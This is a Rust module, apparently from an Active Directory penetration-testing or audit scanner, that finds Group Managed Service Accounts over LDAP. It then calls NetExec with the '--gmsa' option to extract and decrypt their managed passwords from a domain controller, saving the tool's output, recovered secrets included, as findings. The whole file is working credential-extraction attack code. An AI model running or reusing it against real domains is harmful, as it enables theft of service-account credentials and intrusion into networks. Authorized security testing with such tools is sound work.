//! gMSA (Group Managed Service Account) discovery and password extraction.

use super::{AttackContext, require_nxc};
use crate::findings::{CheckStatus, Finding, ScanResults, Severity};
use crate::scanner::ldap::{LdapClient, gmsa_filter};
use anyhow::Result;

const GMSA_ATTRS: &[&str] = &[
    "sAMAccountName",
    "msDS-GroupManagedServiceAccount",
    "msDS-ManagedPasswordId",
    "msDS-GroupIdAttribute",
    "distinguishedName",
    "objectClass",
];

/// Discover gMSA accounts via LDAP; attempt password extraction (LDAPS +
/// msDS-ManagedPassword) via nxc, which handles the blob decryption.
pub async fn run(ctx: &AttackContext<'_>, results: &ScanResults) -> Result<()> {
    let entries = ctx
        .ldap
        .search(&ctx.ldap_base_dn(), gmsa_filter(), GMSA_ATTRS)
        .await?;

    if entries.is_empty() {
        results.push(Finding::new(
            ctx.dc,
            "ldap",
            "gmsa",
            CheckStatus::NotVulnerable,
            Severity::Info,
            serde_json::json!({ "message": "no gMSA accounts found" }),
        ));
        return Ok(());
    }

    for e in &entries {
        let sam = LdapClient::attr(e, "sAMAccountName").unwrap_or("?");
        results.push(Finding::new(
            ctx.dc,
            "ldap",
            "gmsa",
            CheckStatus::Vulnerable,
            Severity::Medium,
            serde_json::json!({
                "account": sam,
                "distinguished_name": LdapClient::attr(e, "distinguishedName"),
                "note": "gMSA present; password extraction depends on read permissions on msDS-ManagedPassword",
            }),
        ));
    }

    let nxc = match require_nxc(ctx.nxc) {
        Ok(n) => n,
        Err(err) => {
            results.push(Finding::new(
                ctx.dc,
                "ldap",
                "gmsa",
                CheckStatus::Error,
                Severity::Info,
                serde_json::json!({ "message": format!("discovery complete; {}", err) }),
            ));
            return Ok(());
        }
    };

    let mut args: Vec<&str> = vec!["ldap", ctx.dc];
    let secret = ctx.nxc_secret_args();
    let secret_refs: Vec<&str> = secret.iter().map(String::as_str).collect();
    args.extend(secret_refs);
    args.push("--gmsa");
    match nxc.run(&args).await {
        Ok((stdout, stderr, success)) => {
            let status = if success { CheckStatus::Success } else { CheckStatus::Error };
            results.push(Finding::new(
                ctx.dc,
                "ldap",
                "gmsa",
                status,
                Severity::Info,
                serde_json::json!({
                    "message": "nxc gmsa extraction finished",
                    "stdout": stdout.trim(),
                    "stderr": stderr.trim(),
                }),
            ));
        }
        Err(e) => {
            results.push(Finding::new(
                ctx.dc,
                "ldap",
                "gmsa",
                CheckStatus::Error,
                Severity::Info,
                serde_json::json!({ "message": e.to_string() }),
            ));
        }
    }
    Ok(())
}
